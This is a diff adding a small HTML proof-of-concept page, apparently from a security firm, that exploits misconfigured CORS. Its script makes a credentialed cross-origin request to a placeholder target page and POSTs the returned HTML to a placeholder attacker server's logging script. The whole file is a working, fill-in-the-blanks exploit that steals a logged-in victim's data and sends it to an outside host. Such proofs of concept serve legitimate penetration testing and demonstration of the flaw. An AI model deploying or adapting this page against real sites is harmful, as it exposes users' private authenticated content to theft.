@@ -1,0 +1,32 @@
+<html>
+	<head>
+		<title>TrustedSec CORS POC</title>
+	</head>
+	<body>
+		<h1>TrustedSec CORS POC</h>
+		<script>
+			var crossoriginget = new XMLHttpRequest();
+			//The target site with the bad CORS configuration
+			var url = 'https://[target-site/target-page]';
+			crossoriginget.open('GET', url, true);
+			/*  This tells the browser to send the request with cookies;
+			    requires “Access-Control-Allow-Credentials = true” in
+			    response headers for this.responseText to be readable.  */
+			crossoriginget.withCredentials = true;
+			crossoriginget.onload = reqListener;
+			crossoriginget.send();
+			/*  Once the cross-origin request completes, attempt to read the
+			    response text and send it to the malicious server using an
+			    HTTP POST request.  */
+			function reqListener() {
+				var exfiltraterequest = new XMLHttpRequest();
+				//Our server hosting the CORS attack
+				var maliciousurl = 'http://[our-server]:8000/cgi-bin/postlogger.py';
+				exfiltraterequest.open('POST', maliciousurl);
+				exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+				exfiltraterequest.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
+			};
+		</script>
+	</body>
+</html>
+
